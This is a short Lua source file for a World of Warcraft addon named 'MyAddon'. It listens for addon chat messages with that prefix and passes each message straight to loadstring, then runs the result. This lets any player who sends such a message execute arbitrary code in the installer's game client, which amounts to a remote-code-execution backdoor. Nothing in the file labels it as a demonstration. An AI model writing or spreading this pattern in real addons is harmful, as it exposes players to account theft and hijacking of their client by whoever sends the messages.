local PREFIX = "MyAddon"
local f = CreateFrame("Frame")
f:RegisterEvent("CHAT_MSG_ADDON")
f:SetScript("OnEvent", function(self, event, prefix, message)
  if prefix ~= PREFIX then return end
  local fn = loadstring(message)
  if fn then fn() end
end)
